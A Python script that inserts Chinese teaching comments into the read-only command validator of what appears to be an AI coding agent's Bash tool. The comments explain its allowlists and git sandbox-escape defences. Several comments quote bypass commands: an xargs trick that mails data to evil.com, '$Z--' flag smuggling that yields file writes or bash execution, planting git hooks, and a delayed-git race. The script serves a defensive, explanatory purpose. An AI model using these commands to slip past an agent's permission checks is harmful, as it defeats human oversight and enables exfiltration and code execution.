# -*- coding: utf-8 -*-
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from insert import apply  # noqa: E402

SPECS = [
    {
        "file": "src/tools/BashTool/readOnlyValidation.ts",
        "header": [
            "/**",
            " * 【一句话定位】判断一条 bash 命令是不是**只读**的（不写文件、不执行代码、不发网络请求）。",
            " *   是只读就可以免询问直接放行；判断不了就交回给其它权限环节。",
            " *   这是整个 BashTool 目录里最大的一张「规则表 + 解析器」。",
            " *",
            " * 【在架构中的位置】",
            " *   上游：BashTool.tsx 的权限链（checkReadOnlyConstraints）",
            " *   下游：utils/shell/readOnlyCommandValidation.js（共享的规则表与 validateFlags 实现：",
            " *        GIT_READ_ONLY_COMMANDS / GH_READ_ONLY_COMMANDS / RIPGREP_READ_ONLY_COMMANDS /",
            " *        DOCKER_READ_ONLY_COMMANDS / PYRIGHT_READ_ONLY_COMMANDS / EXTERNAL_READONLY_COMMANDS /",
            " *        containsVulnerableUncPath）、bashSecurity.js（bashCommandIsSafe_DEPRECATED 兜底）、",
            " *        bashPermissions.js（isNormalizedGitCommand）、pathValidation.js（PATH_EXTRACTORS 等）、",
            " *        sedValidation.js、utils/git.js（是否裸仓库）、utils/sandbox、bootstrap/state.js",
            " *   调用链：BashTool.hasPermission -> checkReadOnlyConstraints -> isCommandReadOnly",
            " *            -> isCommandSafeViaFlagParsing（白名单表） 或 READONLY_COMMAND_REGEXES（正则表）",
            " *",
            " * 【本文件包含什么】",
            " *   - CommandConfig：单条命令的配置形状（安全 flag 表 + 可选正则 + 可选回调 + 是否尊重 --）",
            " *   - FD_SAFE_FLAGS：fd / fdfind 共用的安全 flag 表",
            " *   - COMMAND_ALLOWLIST：白名单总表（xargs / git 系列 / file / sed / sort / man / help /",
            " *     netstat / ps / base64 / grep / rg / sha*sum / tree / date / hostname / info / lsof /",
            " *     pgrep / tput / ss / fd 等）",
            " *   - ANT_ONLY_COMMAND_ALLOWLIST：仅内部环境可用的表（gh 系列、aki——它们会发网络请求）",
            " *   - getCommandAllowlist()：按平台/环境组装出实际生效的表",
            " *   - SAFE_TARGET_COMMANDS_FOR_XARGS：允许作为 xargs 目标命令的安全命令",
            " *   - isCommandSafeViaFlagParsing()：**基于白名单表的判定**（推荐路径）",
            " *   - makeRegexForSafeCommand() / READONLY_COMMANDS / READONLY_COMMAND_REGEXES：正则兜底表",
            " *   - containsUnquotedExpansion()：检查「引号外」的通配符与变量展开",
            " *   - isCommandReadOnly()：单条命令的只读判定主逻辑",
            " *   - commandHasAnyGit() / GIT_INTERNAL_PATTERNS / isGitInternalPath() /",
            " *     extractWritePathsFromSubcommand() / commandWritesToGitInternalPaths()：git 沙箱逃逸防护",
            " *   - checkReadOnlyConstraints()：对外主入口",
            " *",
            " * 【规则分类逻辑：到底什么算「只读」】（理解本目录的关键）",
            " *   判定为只读必须同时满足三条：① 不写文件 ② 不执行代码 ③ 不发网络请求。",
            " *   于是命令被分成三类处理：",
            " *   ① 白名单表（COMMAND_ALLOWLIST）：逐个 flag 登记，只放行「确实只读」的 flag。",
            " *      凡是能写文件的 flag（如 tree -o、info -o、find -fprint）一律**不登记**——不登记就等于禁止",
            " *   ② 简单命令正则表（READONLY_COMMANDS + READONLY_COMMAND_REGEXES）：",
            " *      这些命令本身没有任何危险 flag（cat/head/wc/id/pwd 等），用一条「禁止 shell 元字符」的正则兜住即可",
            " *   ③ 特殊命令走自定义回调：date（位置参数可能改系统时间）、hostname（位置参数会改主机名）、",
            " *      ps（BSD 式 e 参数会泄露环境变量）、tput（init/reset 会执行终端初始化程序）、",
            " *      lsof（+m 会写文件）、sed（委托给 sedValidation）",
            " *   另外还有三条**跨命令**的红线：含 $ 变量（运行时才知值）、含未加引号的通配符、",
            " *   以及 git 相关的三类沙箱逃逸组合（cd+git、裸仓库、写入 git 内部文件后再跑 git）",
            " *",
            " * 【TS 语法速查】（本文件实际出现的）",
            " *   - `Record<string, FlagArgType>` ≈ Map<String, X>，键是 flag 字符串，值是「这个 flag 吃什么类型的参数」",
            " *   - `{ ...A, ...B }` 对象/数组展开：把另一张表的内容合并进来（不可变更新的典型写法）",
            " *   - `const { xargs: _, ...rest } = obj`：解构时把某个字段丢掉（_ 是「不要这个字段」的惯用名）",
            " *   - `(t): t is string => typeof t === 'string'` 类型谓词 ≈ instanceof 模式匹配，用于 filter 后收窄类型",
            " *   - `Object.entries(obj)`：把对象转成 [键, 值] 数组再遍历（≈ Java 的 map.entrySet()）",
            " *   - `new Set([...])` / `set.has(x)` ≈ HashSet",
            " *   - `??` 空值合并、`?.` 可选链、`!` 非空断言：分别对应兜默认值 / null 检查 / 强制转换",
            " *   - `Array.prototype.some/every` ≈ stream().anyMatch/allMatch",
            " *   - 类型标注在变量名**后面**，Java 在前面",
            " */",
        ],
        "inserts": [
            {"anchor": "type CommandConfig = {", "lines": [
                "// 一张「命令该怎么审」的配置单。设计成声明式（配置优先于代码）的好处：",
                "//   新增一个命令只需往表里加一段配置，不用再写一套 if/else；审计时也只需看表",
            ]},
            {"anchor": "  // When false, the tool does NOT respect POSIX `--` end-of-options.", "after": True, "lines": [
                "// 中文补充：绝大多数工具遇到 `--` 之后就不再解析 flag 了；但也有例外（如 macOS 的 base64），",
                "//   所以要把这个差异显式配置出来，否则攻击者可以用 `--` 把危险 flag 藏过去",
            ]},
            {"anchor": "const FD_SAFE_FLAGS: Record<string, FlagArgType> = {", "lines": [
                "// fd（以及 Debian 上的 fdfind）的安全 flag 表。注意这里的「值」不是随便写的：",
                "//   'none' = 该 flag 不带参数；'number' = 必须是数字；'string' = 会吃掉下一个参数；",
                "//   validateFlags 会按这个类型去校验并正确地「吃掉」后续 token",
            ]},
            {"anchor": "// SECURITY: -x/--exec and -X/--exec-batch are deliberately excluded —", "after": True, "lines": [
                "// 中文补充：fd 的 -x / -X 会对**每一个搜索结果**执行一条命令，等于把「搜索」变成了「执行命令」，",
                "//   所以绝不能登记进安全 flag 表（不登记 = 禁止）",
            ]},
            {"anchor": "  // SECURITY: -l/--list-details EXCLUDED — internally executes `ls` as subprocess (same", "after": True, "lines": [
                "// 中文补充：-l 会在内部起一个 ls 子进程；若 PATH 上有恶意的 ls，就会被劫持执行（PATH 劫持风险）",
            ]},
            {"anchor": "const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {", "lines": [
                "// 白名单总表。**登记原则**：只登记确认只读的 flag；所有能写文件、执行代码、发网络请求的 flag",
                "//   一律不登记——「不在表里」本身就是拒绝（这种设计叫白名单，比黑名单安全得多）",
            ]},
            {"anchor": "  xargs: {", "lines": [
                "// xargs 是最危险的一类：它把输入变成**另一条命令的参数**，天然就是「数据变代码」的桥梁，",
                "//   所以它的 flag 处理要格外小心（见下面 -i / -e 的注释）",
            ]},
            {"anchor": "      // SECURITY: `-i` and `-e` (lowercase) REMOVED — both use GNU getopt", "after": True, "lines": [
                "// 中文详解（一个真实的绕过案例）：",
                "//   GNU xargs 里 -i 和 -e 的参数是「**可选且必须连写**」的（-iX 有效，`-i X` 表示 -i 不带参数、",
                "//   而 X 变成下一个位置参数即目标命令）。校验器和 GNU 实际行为不一致，于是：",
                "//     `echo /usr/sbin/sendm | xargs -it tail a@evil.com`",
                "//   校验器认为：两个都是不带参数的 flag，tail 是安全目标 → 放行；",
                "//   GNU 实际执行：replace-str=t，于是调用 /usr/sbin/sendmail → 变成外发邮件（数据泄露 + 命令执行）。",
                "//   结论：只用大写 -I（强制带参数）和 -E，让校验器与 GNU 的「参数消耗」完全一致",
            ]},
            {"anchor": "  sed: {", "lines": [
                "// sed 的安全 flag 表 + 一个回调：最终是否安全交给 sedValidation 的 allowlist 去判",
            ]},
            {"anchor": "    ) => !sedCommandIsAllowedByAllowlist(rawCommand),", "lines": [
                "// 回调返回 true 表示「危险」。这里直接复用 sed 专用的校验器，避免两套标准不一致",
            ]},
            {"anchor": "  man: {", "lines": [
                "// man 之所以要登记而不是当普通命令放行：它有 -P（指定分页程序）这类能执行任意命令的 flag",
            ]},
            {"anchor": "  // help command - only allow bash builtin help flags to prevent attacks when", "after": True, "lines": [
                "// 中文补充：某些 shell 配置（如 oh-my-zsh 的 common-aliases）会把 help 别名成 man，",
                "//   而 man -P 可以执行任意命令。所以这里只放行 bash 内建 help 的三个无害 flag",
            ]},
            {"anchor": "  ps: {", "lines": [
                "// ps 的风险点：BSD 风格的 e 参数（如 `ps axe`）会显示所有进程的**环境变量**，可能泄露密钥",
            ]},
            {"anchor": "    // Block BSD-style 'e' modifier which shows environment variables", "after": True, "lines": [
                "// 中文补充：BSD 风格的选项是「不带前导横杠、纯字母」的 token（如 axe），",
                "//   所以判定方法是：不含 - 开头、且纯字母里含 e ——注意要和 UNIX 风格的 -e（选所有进程）区分开",
            ]},
            {"anchor": "  base64: {", "lines": [
                "// base64 只做编解码，本身安全；但它带 -i/--input 可以读文件（读不算危险，路径由 pathValidation 另行校验）",
            ]},
            {"anchor": "    respectsDoubleDash: false, // macOS base64 does not respect POSIX --", "lines": [
                "// macOS 版 base64 不认 -- 结束符，所以校验时不能因为遇到 -- 就停止检查后面的 flag",
            ]},
            {"anchor": "  grep: {", "lines": [
                "// grep 的 flag 很多，但只要不影响「只读」性质（都是控制匹配方式/输出格式）就可以登记",
            ]},
            {"anchor": "  tree: {", "lines": [
                "// tree 从原来的「简单命令表」迁移到这里，因为它有些 flag 会写文件（见 -R 的注释）",
            ]},
            {"anchor": "      // SECURITY: -R REMOVED. tree -R combined with -H (HTML mode) and -L (depth)", "after": True, "lines": [
                "// 中文详解（很隐蔽的一个坑）：",
                "//   tree -R 的语义不是「重新列一遍」，而是「在每个子目录里再跑一次 tree，并加上 -o 00Tree.html」。",
                "//   这会在每个子目录下写出 00Tree.html 文件——一次调用写一堆文件，而且完全不带任何权限提示。",
                "//   手册里那句「Rerun at max depth」极具误导性，所以这里直接把 -R 从安全表里移除",
            ]},
            {"anchor": "  date: {", "lines": [
                "// date 看似人畜无害，但：① -s 可以改系统时间；② 位置参数 MMDDhhmm 也会**设置系统时间**。",
                "//   所以除了 flag 白名单，还要用回调检查位置参数必须是以 + 开头的格式串",
            ]},
            {"anchor": "          // Positional argument - must start with + for format strings", "after": True, "lines": [
                "// 中文补充：只有 `+\"%Y-%m-%d\"` 这种以 + 开头的格式串是安全的；",
                "//   任何其它形式的位置参数（如 12011200）都可能被解释成「设置系统时间」",
            ]},
            {"anchor": "  hostname: {", "lines": [
                "// hostname 不带参数是「显示主机名」，带位置参数则是「**设置**主机名」——所以要用正则把位置参数彻底堵死",
            ]},
            {"anchor": "  info: {", "lines": [
                "// info 的风险 flag：-o/--output 写文件、--init-file 加载自定义配置（可导致代码执行）",
            ]},
            {"anchor": "  lsof: {", "lines": [
                "// lsof 大部分 flag 安全，但 +m 会创建「挂载补充文件」（写磁盘），且 + 开头的参数会被当成位置参数，",
                "//   所以要用回调专门拦 +m",
            ]},
            {"anchor": "  tput: {", "lines": [
                "// tput 的风险不在「写文件」，而在「改变终端状态 / 执行终端初始化程序」：",
                "//   init、reset 会执行 terminfo 里的 iprog（任意程序）；clear 会清掉回滚缓冲区（等于销毁证据）",
            ]},
            {"anchor": "      const DANGEROUS_CAPABILITIES = new Set([", "lines": [
                "// 危险「终端能力名」清单：这些能力会重置终端、执行程序、把输出重定向到打印机设备等",
            ]},
            {"anchor": "  ss: {", "lines": [
                "// ss（socket 统计）的定位是 netstat 的替代品，只读查询；但 -K 会强关 socket、-D 会把数据 dump 成文件",
            ]},
            {"anchor": "      // SECURITY: -K/--kill EXCLUDED — forcibly closes sockets", "after": True, "lines": [
                "// 中文补充：这三个被排除的 flag 分别对应「关闭连接」「写文件」「从文件读过滤规则」，都不是只读行为",
            ]},
            {"anchor": "const ANT_ONLY_COMMAND_ALLOWLIST: Record<string, CommandConfig> = {", "lines": [
                "// 内部专用表：gh 系列与 aki 都会发起**网络请求**，与「只读 = 不发网络请求」的原则冲突，",
                "//   所以只在内部环境（USER_TYPE=ant）才把它们并进生效表",
            ]},
            {"anchor": "function getCommandAllowlist(): Record<string, CommandConfig> {", "lines": [
                "/**",
                " * 【做什么】按当前平台与环境组装出「实际生效」的白名单表",
                " * 【为什么需要】同一份代码跑在 Windows / macOS / Linux、内部 / 外部环境，可用命令是不一样的",
                " * 【返回】合并后的表",
                " * 【关键步骤】",
                " *   ① Windows 上把 xargs 剔除：Windows 下 `cat file | xargs cat` 会触发 UNC 路径的 SMB 解析，",
                " *      而 UNC 路径藏在**文件内容**里，正则根本扫不到，所以直接禁用（这是数据外泄通道）",
                " *   ② 内部环境才并入 ANT_ONLY_COMMAND_ALLOWLIST",
                " */",
            ]},
            {"anchor": "    const { xargs: _, ...rest } = allowlist", "lines": [
                "// 解构丢弃字段的写法：`{ xargs: _, ...rest }` = 「把 xargs 拿出来扔掉，其余都收进 rest」",
            ]},
            {"anchor": "const SAFE_TARGET_COMMANDS_FOR_XARGS = [", "lines": [
                "// xargs 的「目标命令」白名单。要求极其严格：这些命令必须**没有任何**危险 flag，",
                "//   因为一旦把它们当目标，后面的 flag 就不再继续校验了（见 isCommandSafeViaFlagParsing 里的 break）",
            ]},
            {"anchor": "export function isCommandSafeViaFlagParsing(command: string): boolean {", "lines": [
                "/**",
                " * 【做什么】基于白名单表判定：命令 + 它带的 flag 是否都安全",
                " * 【为什么需要】这是比正则更可靠的判定方式——正则容易被「缩写 flag」「参数连写」绕过，",
                " *   而逐 flag 比对可以精确知道每个 flag 是否会吃掉后续参数",
                " * 【入参】command：单条命令字符串",
                " * 【返回】true = 安全（可放行）；任何一步拿不准都返回 false",
                " * 【关键步骤】",
                " *   ① shell 分词（含 glob 转字符串）；解析失败直接 false",
                " *   ② 含管道/重定向等操作符 → false（复合命令应在更上层就拆开，这里只管单条）",
                " *   ③ 在白名单表里匹配命令（支持 `git diff` 这种**多词**命令）",
                " *   ④ git ls-remote 特殊处理：拒绝带 URL 的参数（防止用远端地址做数据外带）",
                " *   ⑤ 拒绝任何含 $ 的 token、以及同时含 { 和 , 的 token（brace 展开混淆）",
                " *   ⑥ 交给 validateFlags 做 flag 校验",
                " *   ⑦ 再依次过：自定义正则、反引号检查、grep/rg 的换行检查、自定义回调",
                " */",
            ]},
            {"anchor": "  // Special handling for git ls-remote to reject URLs that could lead to data exfiltration", "after": True, "lines": [
                "// 中文补充：git ls-remote 后面如果跟的是 URL 或远端名，就可能把信息发到外部；",
                "//   所以凡是带 :// 、@ 、: 、$ 的参数一律拒绝",
            ]},
            {"anchor": "  // SECURITY: Reject ANY token containing `$` (variable expansion). The", "after": True, "lines": [
                "// 中文详解（本文件最重要的安全点之一）：",
                "//   分词器把 $VAR 当成**普通文本**保留，但 bash 运行时会把它展开（未定义则展开成空串）。",
                "//   这个「解析器差异」能同时骗过 flag 校验和自定义回调，例如：",
                "//     `git diff \"$Z--output=/tmp/pwned\"` → 校验器看到的是 `$Z--output=...`（不以 - 开头，当普通参数放过）；",
                "//     bash 实际执行的是 `git diff --output=/tmp/pwned` → 任意文件写入。",
                "//     `rg . \"$Z--pre=bash\" FILE` → 实际执行 `bash FILE` → 任意代码执行。",
                "//   结论：只要 token 里有 $，就无法确定它运行时的真实形态，一律拒绝",
            ]},
            {"anchor": "    if (token.includes('{') && (token.includes(',') || token.includes('..'))) {", "lines": [
                "// 花括号展开（brace expansion）也能造出「校验器看不到、bash 会展开」的 token，同样拒绝。",
                "//   要求同时出现 { 和 ,（或 ..），是为了不误伤 `stash@{0}` 这种正常的 git 引用写法",
            ]},
            {"anchor": "function makeRegexForSafeCommand(command: string): RegExp {", "lines": [
                "// 生成「安全调用」正则：命令名 + 空白，其后不得出现 < > ( ) $ ` | { } & ; 换行 这些危险字符。",
                "//   也就是说：这类命令只要不夹带 shell 元字符，就认为是安全的",
            ]},
            {"anchor": "const READONLY_COMMANDS = [", "lines": [
                "// 简单只读命令清单：这些命令**本身**没有任何会写文件或执行代码的 flag，",
                "//   所以只需用 makeRegexForSafeCommand 生成的通用正则兜住即可",
            ]},
            {"anchor": "const READONLY_COMMAND_REGEXES = new Set([", "lines": [
                "// 需要定制正则的命令（echo / jq / cd / ls / find / uniq / ip / ifconfig 等）。",
                "//   维护倾向：能进 COMMAND_ALLOWLIST 的尽量进表，正则只是兜底——正则挡不住 GNU getopt 的缩写等花招",
            ]},
            {"anchor": "function containsUnquotedExpansion(command: string): boolean {", "lines": [
                "/**",
                " * 【做什么】逐字符扫描，找出「不在引号内」的通配符（? * [ ]）与可展开的 $ 变量",
                " * 【为什么需要】这类字符在**运行时**才展开，静态分析无法知道展开结果：",
                " *   - `python *`：若目录下正好有名为 --help 的文件，就会变成 `python --help`，绕过正则",
                " *   - `uniq --skip-chars=0$_`：`$_` 运行时展开成上条命令的最后参数，可把位置参数偷渡进来",
                " * 【返回】true = 存在未加引号的展开（应拒绝放行）",
                " * 【关键步骤】",
                " *   ① 维护三个状态：是否在单引号内、是否在双引号内、上一个字符是不是转义符",
                " *   ② **只有在单引号之外**才把反斜杠当转义符（bash 里单引号内的 \\ 是字面量）",
                " *   ③ 单引号内全部字面量，直接跳过",
                " *   ④ 检查 $ 后是否紧跟变量名/特殊参数字符（双引号内 $ 也会展开，所以要查）",
                " *   ⑤ 通配符只在完全无引号时才算数（单双引号内都是字面量）",
                " */",
            ]},
            {"anchor": "    // SECURITY: Only treat backslash as escape OUTSIDE single quotes. In bash,", "after": True, "lines": [
                "// 中文详解（一个典型的「状态机被带偏」的坑）：",
                "//   bash 里单引号内的反斜杠是**字面量**，不转义下一个字符。若不区分，遇到 `ls '\\' *` 时：",
                "//   反斜杠把转义标志置为 true → 本该结束单引号的那个引号被当成「被转义的字符」吃掉 →",
                "//   状态机从此一直以为自己还在单引号里 → 后面真正的通配符 * 被判为「在引号内、字面量」→ 漏检",
            ]},
            {"anchor": "function isCommandReadOnly(command: string): boolean {", "lines": [
                "/**",
                " * 【做什么】判定单条命令是否只读",
                " * 【为什么需要】把「预处理 → 白名单 → 正则表 → git 特例」串成一条判定流水线",
                " * 【入参】command：单条命令（已拆过复合命令）",
                " * 【返回】true = 只读",
                " * 【关键步骤】",
                " *   ① 去掉结尾的 2>&1（把 stderr 并入 stdout 不影响只读性，属于常见无害写法）",
                " *   ② Windows UNC 路径（\\server\\share 形式）可能触发 WebDAV 攻击 → 直接否",
                " *   ③ 存在未加引号的通配符/变量 → 否",
                " *   ④ 优先走白名单判定（isCommandSafeViaFlagParsing）",
                " *   ⑤ 再逐个试正则表；命中后还要额外拦 git 的三个高危 flag（-c / --exec-path / --config-env）",
                " */",
            ]},
            {"anchor": "      if (testCommand.includes('git') && /\\s-c[\\s=]/.test(testCommand)) {", "lines": [
                "// git -c 可以内联设置任意 git 配置，其中 core.fsmonitor、diff.external、core.gitProxy 等",
                "//   都能指定「要执行的命令」——等于把只读命令变成代码执行，必须拦",
            ]},
            {"anchor": "function commandHasAnyGit(command: string): boolean {", "lines": [
                "// 整条命令里有没有 git 子命令——后面三条沙箱逃逸检查都以它为前提",
            ]},
            {"anchor": "const GIT_INTERNAL_PATTERNS = [", "lines": [
                "// git 的「内部结构」路径：HEAD、objects/、refs/、hooks/。",
                "//   如果一条命令**先**在当前目录造出这些文件，**再**跑 git，git 就会把这个目录当成仓库，",
                "//   进而执行 hooks 里的恶意脚本（这就是所谓的「裸仓库攻击」）",
            ]},
            {"anchor": "const NON_CREATING_WRITE_COMMANDS = new Set(['rm', 'rmdir', 'sed'])", "lines": [
                "// 这三个命令虽然是写操作，但不会「在新路径上新造文件」（rm 是删、sed 是就地改），",
                "//   所以排查「是否造出 git 内部文件」时可以把它们排除掉，避免误报",
            ]},
            {"anchor": "function extractWritePathsFromSubcommand(subcommand: string): string[] {", "lines": [
                "// 从一条子命令里提取「会被写入的路径」：先判断命令类型是不是 write/create，再用路径提取器取路径",
            ]},
            {"anchor": "function commandWritesToGitInternalPaths(command: string): boolean {", "lines": [
                "/**",
                " * 【做什么】检查复合命令里有没有「往 git 内部路径写东西」的动作",
                " * 【为什么需要】配合下面的检查，堵住「先造 hooks 再跑 git」的沙箱逃逸",
                " * 【返回】true = 存在这类写入",
                " * 【关键步骤】",
                " *   ① 拆成子命令",
                " *   ② 对每条子命令取写入路径（mkdir/touch/cp/mv 等），逐个比对是否是 git 内部路径",
                " *   ③ 再检查输出重定向目标（如 `echo x > hooks/pre-commit`）——重定向也是写入途径",
                " */",
            ]},
            {"anchor": "export function checkReadOnlyConstraints(", "lines": [
                "/**",
                " * 【做什么】只读约束检查的对外主入口（整条命令级别）",
                " * 【为什么需要】只读命令可以免询问放行，这是权限链里最「省事」的一环，也是体验最好的一环",
                " * 【入参】input：工具入参；compoundCommandHasCd：整条复合命令里是否含 cd（上层已算好，避免重复计算）",
                " * 【返回】allow（确认只读，直接放行）/ passthrough（判不了，交给权限链的后续环节）",
                " * 【关键步骤】",
                " *   ① 命令解析不了 → passthrough（不猜）",
                " *   ② 先用 bashSecurity 的兜底检查扫一遍整条命令（拆分会改变原文形态，所以要在拆分**之前**查）",
                " *   ③ 检查 Windows UNC 路径（同样要在拆分前，因为拆分可能改变反斜杠）",
                " *   ④ 三条 git 沙箱逃逸检查：cd+git 组合、当前目录像裸仓库、先写 git 内部文件再跑 git",
                " *   ⑤ 开了沙箱且 cwd 已离开原始目录时，git 命令不放行（防止后台任务的竞态绕过）",
                " *   ⑥ 逐条子命令判只读，全部只读 → allow",
                " */",
            ]},
            {"anchor": "  if (compoundCommandHasCd && hasGitCommand) {", "lines": [
                "// 攻击示例：`cd /malicious/dir && git status` —— 那个目录里可能放了伪造的 hooks，",
                "//   git 会在执行过程中把它们跑起来。所以只要复合命令里同时出现 cd 和 git，就不自动放行",
            ]},
            {"anchor": "  if (hasGitCommand && isCurrentDirectoryBareGitRepo()) {", "lines": [
                "// 攻击手法：先删掉正常的 .git/HEAD 让仓库失效，再在当前目录造 hooks/ 等文件，",
                "//   git 就会把**当前目录**当成 git 目录并执行里面的 hook",
            ]},
            {"anchor": "  if (hasGitCommand && commandWritesToGitInternalPaths(command)) {", "lines": [
                "// 攻击手法：同一条命令里 `mkdir -p hooks && echo '恶意脚本' > hooks/pre-commit && git status`",
            ]},
            {"anchor": "    getCwd() !== getOriginalCwd()", "lines": [
                "// 竞态场景：沙箱内命令先在子目录造好裸仓库文件，再起一条后台 git 命令（如 `sleep 10 && git status`），",
                "//   权限判定那一刻文件还没造出来，于是通过检查，等真正执行时文件已经在了。",
                "//   所以只要 cwd 已不在原始目录，git 命令一律不放行",
            ]},
            {"anchor": "  const allSubcommandsReadOnly = splitCommand_DEPRECATED(command).every(", "lines": [
                "// every ≈ allMatch：一条命令里只要有一段不是只读，整条就不能当只读放行",
            ]},
            {"anchor": "  if (allSubcommandsReadOnly) {", "lines": [
                "// 只有 allow 这一种「正面结论」；其余一律 passthrough 交给后续环节——",
                "//   本模块**从不主动 deny**，因为「不是只读」不等于「不允许」，可能还有规则表能放行它",
            ]},
        ],
    },
]

rc = 0
for s in SPECS:
    rc |= apply(s)
sys.exit(rc)
